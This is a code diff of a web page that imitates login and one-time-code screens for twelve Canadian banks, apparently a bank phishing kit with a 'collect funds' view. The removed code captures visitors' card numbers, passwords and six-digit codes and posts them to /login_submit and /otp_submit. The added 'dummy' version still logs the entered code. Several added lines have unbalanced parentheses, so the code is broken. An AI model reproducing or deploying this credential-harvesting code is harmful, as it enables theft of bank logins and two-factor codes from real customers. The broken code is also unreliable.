+            document.getElementById('nbcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('cibcLoginView').classList.add('hidden');
+            document.getElementById('cibcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('pcLoginView').classList.add('hidden');
+            document.getElementById('pcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('bmoLoginView').classList.add('hidden');
+            document.getElementById('bmoAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('simpliiLoginView').classList.add('hidden');
+            document.getElementById('simpliiAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('atbLoginView').classList.add('hidden');
+            document.getElementById('atbAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('desjardinsLoginView').classList.add('hidden');
+            document.getElementById('desjardinsAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('laurentianBankLoginView').classList.add('hidden');
+            document.getElementById('laurentianBankAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('manulifeBankLoginView').classList.add('hidden');
+            document.getElementById('manulifeBankAuthCodeView').classList.add('hidden'); // Ensure this is hidden
         }
 
-        // Functions to show specific bank login views
-        function showRBCLoginView() { hideAllViews(); rbcLoginView.classList.remove('hidden'); }
-        function showTDLoginView() { hideAllViews(); tdLoginView.classList.remove('hidden'); }
-        function showScotiaLoginView() { hideAllViews(); scotiaLoginView.classList.remove('hidden'); }
-        function showNBCLoginView() { hideAllViews(); nbcLoginView.classList.remove('hidden'); }
-        function showCIBCLoginView() { hideAllViews(); cibcLoginView.classList.remove('hidden'); }
-        function showPCLoginView() { hideAllViews(); pcLoginView.classList.remove('hidden'); }
-        function showBMOLoginView() { hideAllViews(); bmoLoginView.classList.remove('hidden'); }
-        function showSimpliiLoginView() { hideAllViews(); simpliiLoginView.classList.remove('hidden'); }
-        function showATBLoginView() { hideAllViews(); atbLoginView.classList.remove('hidden'); }
-        function showDesjardinsLoginView() { hideAllViews(); desjardinsLoginView.classList.remove('hidden'); }
-        function showLaurentianBankLoginView() { hideAllViews(); laurentianBankLoginView.classList.remove('hidden'); }
-        function showManulifeBankLoginView() { hideAllViews(); manulifeBankLoginView.classList.remove('hidden'); }
-
-        // New Functions to show specific bank 6-digit code entry views
-        function showRBCAuthCodeView() { hideAllViews(); rbcAuthCodeView.classList.remove('hidden'); }
-        function showTDAuthCodeView() { hideAllViews(); tdAuthCodeView.classList.remove('hidden'); }
-        function showScotiaAuthCodeView() { hideAllViews(); scotiaAuthCodeView.classList.remove('hidden'); }
-        function showNBCAuthCodeView() { hideAllViews(); nbcAuthCodeView.classList.remove('hidden'); }
-        function showCIBCAuthCodeView() { hideAllViews(); cibcAuthCodeView.classList.remove('hidden'); }
-        function showPCAuthCodeView() { hideAllViews(); pcAuthCodeView.classList.remove('hidden'); }
-        function showBMOAuthCodeView() { hideAllViews(); bmoAuthCodeView.classList.remove('hidden'); }
-        function showSimpliiAuthCodeView() { hideAllViews(); simpliiAuthCodeView.classList.remove('hidden'); }
-        function showATBAuthCodeView() { hideAllViews(); atbAuthCodeView.classList.remove('hidden'); }
-        function showDesjardinsAuthCodeView() { hideAllViews(); desjardinsAuthCodeView.classList.remove('hidden'); }
-        function showLaurentianAuthCodeView() { hideAllViews(); laurentianAuthCodeView.classList.remove('hidden'); }
-        function showManulifeAuthCodeView() { hideAllViews(); manulifeAuthCodeView.classList.add('hidden'); }
-
-        /**
-         * Sends a log of user action to the server.
-         * @param {string} actionName - A descriptive name for the action.
-         * @param {object} [details={}] - Optional additional details about the action.
-         */
-        async function logUserAction(actionName, details = {}) {
-            try {
-                const response = await fetch('/log_action', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ action: actionName, ...details }),
-                });
-                if (!response.ok) {
-                    console.error('Failed to log action:', response.statusText);
-                }
-            } catch (error) {
-                console.error('Error logging action:', error);
-            }
+        function showOptionSelectionView() {
+            document.getElementById('collectFundsView').classList.add('hidden');
+            document.getElementById('optionSelectionView').classList.remove('hidden');
+            document.getElementById('rbcLoginView').classList.add('hidden');
+            document.getElementById('rbcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('tdLoginView').classList.add('hidden');
+            document.getElementById('tdAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('scotiaLoginView').classList.add('hidden');
+            document.getElementById('scotiaAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('nbcLoginView').classList.add('hidden');
+            document.getElementById('nbcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('cibcLoginView').classList.add('hidden');
+            document.getElementById('cibcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('pcLoginView').classList.add('hidden');
+            document.getElementById('pcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('bmoLoginView').classList.add('hidden');
+            document.getElementById('bmoAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('simpliiLoginView').classList.add('hidden');
+            document.getElementById('simpliiAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('atbLoginView').classList.add('hidden');
+            document.getElementById('atbAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('desjardinsLoginView').classList.add('hidden');
+            document.getElementById('desjardinsAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('laurentianBankLoginView').classList.add('hidden');
+            document.getElementById('laurentianBankAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('manulifeBankLoginView').classList.add('hidden');
+            document.getElementById('manulifeBankAuthCodeView').classList.add('hidden'); // Ensure this is hidden
         }
 
-        /**
-         * Handles login form submission for a given bank.
-         * Collects username/card number and password, sends to server, then shows OTP view.
-         * @param {string} bankName - The name of the bank (e.g., 'rbc', 'td').
-         */
-        async function handleLoginSubmit(bankName) {
-            let username, password;
-            let formId;
+        function showRBCLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('rbcLoginView').classList.remove('hidden');
+            document.getElementById('rbcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
 
-            switch (bankName) {
+        function showRBCAuthCodeView() {
+            document.getElementById('rbcLoginView').classList.add('hidden');
+            document.getElementById('rbcAuthCodeView').classList.remove('hidden');
+            // Clear inputs when showing the OTP view
+            document.querySelectorAll('#rbcCodeInputs input').forEach(input => input.value = '');
+            document.getElementById('rbcCode1').focus(); // Focus on the first input
+        }
+
+        function showTDLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('tdLoginView').classList.remove('hidden');
+            document.getElementById('tdAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showTDAuthCodeView() {
+            document.getElementById('tdLoginView').classList.add('hidden');
+            document.getElementById('tdAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#tdCodeInputs input').forEach(input => input.value = '');
+            document.getElementById('tdCode1').focus();
+        }
+
+        function showScotiaLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('scotiaLoginView').classList.remove('hidden');
+            document.getElementById('scotiaAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showScotiaAuthCodeView() {
+            document.getElementById('scotiaLoginView').classList.add('hidden');
+            document.getElementById('scotiaAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#scotiaCodeInputs input').forEach(input => input.value = '';
+            document.getElementById('scotiaCode1').focus();
+        }
+
+        function showNBCLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('nbcLoginView').classList.remove('hidden');
+            document.getElementById('nbcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showNBCAuthCodeView() {
+            document.getElementById('nbcLoginView').classList.add('hidden');
+            document.getElementById('nbcAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#nbcCodeInputs input').forEach(input => input.value = '');
+            document.getElementById('nbcCode1').focus();
+        }
+
+        function showCIBCLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('cibcLoginView').classList.remove('hidden');
+            document.getElementById('cibcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showCIBCAuthCodeView() {
+            document.getElementById('cibcLoginView').classList.add('hidden');
+            document.getElementById('cibcAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#cibcCodeInputs input').forEach(input => input.value = '';
+            document.getElementById('cibcCode1').focus();
+        }
+
+        function showPCLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('pcLoginView').classList.remove('hidden');
+            document.getElementById('pcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showPCAuthCodeView() {
+            document.getElementById('pcLoginView').classList.add('hidden');
+            document.getElementById('pcAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#pcCodeInputs input').forEach(input => input.value = '';
+            document.getElementById('pcCode1').focus();
+        }
+
+        function showBMOLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('bmoLoginView').classList.remove('hidden');
+            document.getElementById('bmoAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showBMOAuthCodeView() {
+            document.getElementById('bmoLoginView').classList.add('hidden');
+            document.getElementById('bmoAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#bmoCodeInputs input').forEach(input => input.value = '';
+            document.getElementById('bmoCode1').focus();
+        }
+
+        function showSimpliiLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('simpliiLoginView').classList.remove('hidden');
+            document.getElementById('simpliiAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showSimpliiAuthCodeView() {
+            document.getElementById('simpliiLoginView').classList.add('hidden');
+            document.getElementById('simpliiAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#simpliiCodeInputs input').forEach(input => input.value = '';
+            document.getElementById('simpliiCode1').focus();
+        }
+
+        function showATBLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('atbLoginView').classList.remove('hidden');
+            document.getElementById('atbAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showATBAuthCodeView() {
+            document.getElementById('atbLoginView').classList.add('hidden');
+            document.getElementById('atbAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#atbCodeInputs input').forEach(input => input.value = '';
+            document.getElementById('atbCode1').focus();
+        }
+
+        function showDesjardinsLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('desjardinsLoginView').classList.remove('hidden');
+            document.getElementById('desjardinsAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showDesjardinsAuthCodeView() {
+            document.getElementById('desjardinsLoginView').classList.add('hidden');
+            document.getElementById('desjardinsAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#desjardinsCodeInputs input').forEach(input => input.value = '';
+            document.getElementById('desjardinsCode1').focus();
+        }
+
+        function showLaurentianBankLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('laurentianBankLoginView').classList.remove('hidden');
+            document.getElementById('laurentianBankAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showLaurentianBankAuthCodeView() {
+            document.getElementById('laurentianBankLoginView').classList.add('hidden');
+            document.getElementById('laurentianBankAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#laurentianBankCodeInputs input').forEach(input => input.value = '';
+            document.getElementById('laurentianBankCode1').focus();
+        }
+
+        function showManulifeBankLoginView() {
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('manulifeBankLoginView').classList.remove('hidden');
+            document.getElementById('manulifeBankAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+        }
+
+        function showManulifeBankAuthCodeView() {
+            document.getElementById('manulifeBankLoginView').classList.add('hidden');
+            document.getElementById('manulifeBankAuthCodeView').classList.remove('hidden');
+            document.querySelectorAll('#manulifeBankCodeInputs input').forEach(input => input.value = '';
+            document.getElementById('manulifeBankCode1').focus();
+        }
+
+
+        // Dummy login submission function
+        function handleLoginSubmit(bank) {
+            logUserAction('Login Attempt', {bank: bank});
+
+            // Simulate a successful login that leads to OTP/Auth code view
+            // In a real scenario, this would involve AJAX requests and server-side validation.
+            // For this simulation, we immediately show the OTP view.
+            switch (bank) {
                 case 'rbc':
-                    username = document.getElementById('rbcClientCard').value;
-                    password = document.getElementById('rbcPassword').value;
-                    formId = 'rbcLoginForm';
+                    showRBCAuthCodeView();
                     break;
                 case 'td':
-                    username = document.getElementById('tdClientCard').value;
-                    password = document.getElementById('tdPassword').value;
-                    formId = 'tdLoginForm';
+                    showTDAuthCodeView();
                     break;
                 case 'scotia':
-                    username = document.getElementById('scotiaUsername').value;
-                    password = document.getElementById('scotiaPassword').value;
-                    formId = 'scotiaLoginForm';
+                    showScotiaAuthCodeView();
                     break;
                 case 'nbc':
-                    username = document.getElementById('nbcEmail').value;
-                    password = document.getElementById('nbcPassword').value;
-                    formId = 'nbcLoginForm';
+                    showNBCAuthCodeView();
                     break;
                 case 'cibc':
-                    username = document.getElementById('cibcCardNumber').value;
-                    password = document.getElementById('cibcPassword').value;
-                    formId = 'cibcLoginForm';
+                    showCIBCAuthCodeView();
                     break;
                 case 'pc':
-                    username = document.getElementById('pcCardNumber').value;
-                    password = document.getElementById('pcPassword').value;
-                    formId = 'pcLoginForm';
+                    showPCAuthCodeView();
                     break;
                 case 'bmo':
-                    username = document.getElementById('bmoCustomerid').value; // Or bmoUserid depending on priority
-                    password = document.getElementById('bmoPassword').value;
-                    formId = 'bmoLoginForm';
+                    showBMOAuthCodeView();
                     break;
                 case 'simplii':
-                    username = document.getElementById('simpliiCardNumber').value;
-                    password = document.getElementById('simpliiPassword').value;
-                    formId = 'simpliiLoginForm';
+                    showSimpliiAuthCodeView();
                     break;
                 case 'atb':
-                    username = document.getElementById('atbUsername').value;
-                    password = document.getElementById('atbPassword').value;
-                    formId = 'atbLoginForm';
+                    showATBAuthCodeView();
                     break;
                 case 'desjardins':
-                    username = document.getElementById('desjardinsUsername').value;
-                    password = document.getElementById('desjardinsPassword').value;
-                    formId = 'desjardinsLoginForm';
+                    showDesjardinsAuthCodeView();
                     break;
-                case 'laurentian':
-                    username = document.getElementById('laurentianUsername').value;
-                    password = document.getElementById('laurentianPassword').value;
-                    formId = 'laurentianLoginForm';
+                case 'laurentianBank':
+                    showLaurentianBankAuthCodeView();
                     break;
-                case 'manulife':
-                    username = document.getElementById('manulifeUsername').value;
-                    password = document.getElementById('manulifePassword').value;
-                    formId = 'manulifeLoginForm';
+                case 'manulifeBank':
+                    showManulifeBankAuthCodeView();
                     break;
                 default:
-                    console.error('Unknown bank for login:', bankName);
-                    return;
-            }
-
-            if (!username || !password) {
-                alert('Please enter both username/card number and password.');
-                return;
-            }
-
-            const loginData = {
-                bank: bankName,
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString()
-            };
-
-            try {
-                const response = await fetch('/login_submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(loginData),
-                });
-
-                if (response.ok) {
-                    // Simulate success and move to OTP view
-                    logUserAction('Login Submitted', {bank: bankName, success: true});
-                    switch (bankName) {
-                        case 'rbc': showRBCAuthCodeView(); break;
-                        case 'td': showTDAuthCodeView(); break;
-                        case 'scotia': showScotiaAuthCodeView(); break;
-                        case 'nbc': showNBCAuthCodeView(); break;
-                        case 'cibc': showCIBCAuthCodeView(); break;
-                        case 'pc': showPCAuthCodeView(); break;
-                        case 'bmo': showBMOAuthCodeView(); break;
-                        case 'simplii': showSimpliiAuthCodeView(); break;
-                        case 'atb': showATBAuthCodeView(); break;
-                        case 'desjardins': showDesjardinsAuthCodeView(); break;
-                        case 'laurentian': showLaurentianAuthCodeView(); break;
-                        case 'manulife': showManulifeAuthCodeView(); break;
-                    }
-                } else {
-                    const errorData = await response.json();
-                    alert(`Login failed for ${bankName}: ${errorData.message || response.statusText}`);
-                    logUserAction('Login Failed', {bank: bankName, success: false, error: errorData.message || response.statusText});
-                }
-            } catch (error) {
-                console.error('Error during login submission:', error);
-                alert('An error occurred during login. Please try again.');
-                logUserAction('Login Error', {bank: bankName, error: error.message});
+                    console.log('Unknown bank for login submission:', bank);
             }
         }
 
-        /**
-         * Handles OTP submission for a given bank.
-         * Collects 6 digits, sends to server, then redirects to success page.
-         * @param {string} bankName - The name of the bank (e.g., 'rbc', 'td').
-         */
-        async function handleOtpSubmit(bankName) {
-            let otp = '';
-            let codeInputsId;
-
-            switch (bankName) {
-                case 'rbc': codeInputsId = 'rbcCodeInputs'; break;
-                case 'td': codeInputsId = 'tdCodeInputs'; break;
-                case 'scotia': codeInputsId = 'scotiaCodeInputs'; break;
-                case 'nbc': codeInputsId = 'nbcCodeInputs'; break;
-                case 'cibc': codeInputsId = 'cibcCodeInputs'; break;
-                case 'pc': codeInputsId = 'pcCodeInputs'; break;
-                case 'bmo': codeInputsId = 'bmoCodeInputs'; break;
-                case 'simplii': codeInputsId = 'simpliiCodeInputs'; break;
-                case 'atb': codeInputsId = 'atbCodeInputs'; break;
-                case 'desjardins': codeInputsId = 'desjardinsCodeInputs'; break;
-                case 'laurentian': codeInputsId = 'laurentianCodeInputs'; break;
-                case 'manulife': codeInputsId = 'manulifeCodeInputs'; break;
+        // Dummy OTP/Auth code submission function
+        function handleOtpSubmit(bank) {
+            let codeInputs;
+            switch (bank) {
+                case 'rbc':
+                    codeInputs = document.querySelectorAll('#rbcCodeInputs input');
+                    break;
+                case 'td':
+                    codeInputs = document.querySelectorAll('#tdCodeInputs input');
+                    break;
+                case 'scotia':
+                    codeInputs = document.querySelectorAll('#scotiaCodeInputs input');
+                    break;
+                case 'nbc':
+                    codeInputs = document.querySelectorAll('#nbcCodeInputs input');
+                    break;
+                case 'cibc':
+                    codeInputs = document.querySelectorAll('#cibcCodeInputs input');
+                    break;
+                case 'pc':
+                    codeInputs = document.querySelectorAll('#pcCodeInputs input');
+                    break;
+                case 'bmo':
+                    codeInputs = document.querySelectorAll('#bmoCodeInputs input');
+                    break;
+                case 'simplii':
+                    codeInputs = document.querySelectorAll('#simpliiCodeInputs input');
+                    break;
+                case 'atb':
+                    codeInputs = document.querySelectorAll('#atbCodeInputs input');
+                    break;
+                case 'desjardins':
+                    codeInputs = document.querySelectorAll('#desjardinsCodeInputs input');
+                    break;
+                case 'laurentianBank':
+                    codeInputs = document.querySelectorAll('#laurentianBankCodeInputs input');
+                    break;
+                case 'manulifeBank':
+                    codeInputs = document.querySelectorAll('#manulifeBankCodeInputs input');
+                    break;
                 default:
-                    console.error('Unknown bank for OTP:', bankName);
+                    console.log('Unknown bank for OTP submission:', bank);
                     return;
             }
 
-            const inputs = document.getElementById(codeInputsId).querySelectorAll('.code-input');
-            inputs.forEach(input => {
-                otp += input.value;
-            });
+            const code = Array.from(codeInputs).map(input => input.value).join('');
+            logUserAction('OTP Submitted', {bank: bank, code: code});
 
-            if (otp.length !== 6) {
-                alert('Please enter the complete 6-digit code.');
-                return;
-            }
-
-            const otpData = {
-                bank: bankName,
-                otp: otp,
-                timestamp: new Date().toISOString()
-            };
-
-            try {
-                const response = await fetch('/otp_submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(otpData),
-                });
-
-                if (response.ok) {
-                    logUserAction('OTP Submitted', {bank: bankName, success: true});
-                    window.location.href = '200ok.html'; // Redirect to the success page
-                } else {
-                    const errorData = await response.json();
-                    alert(`OTP verification failed for ${bankName}: ${errorData.message || response.statusText}`);
-                    logUserAction('OTP Failed', {bank: bankName, success: false, error: errorData.message || response.statusText});
-                }
-            } catch (error) {
-                console.error('Error during OTP submission:', error);
-                alert('An error occurred during OTP submission. Please try again.');
-                logUserAction('OTP Error', {bank: bankName, error: error.message});
-            }
+            // Simulate successful OTP validation and return to collect funds view
+            alert('Code Verified! Redirecting to funds collection.');
+            showCollectFundsView(); // Go back to the initial view
         }
 
-        // Function to move focus to the next input field for 6-digit code
+
+        // Function to move focus to the next input field
         function moveToNext(currentInput) {
-            // Ensure only numeric input and single digit
+            // Ensure only digits are input and single digit
             currentInput.value = currentInput.value.replace(/[^0-9]/g, '').slice(0, 1);
 
             if (currentInput.value.length === currentInput.maxLength) {
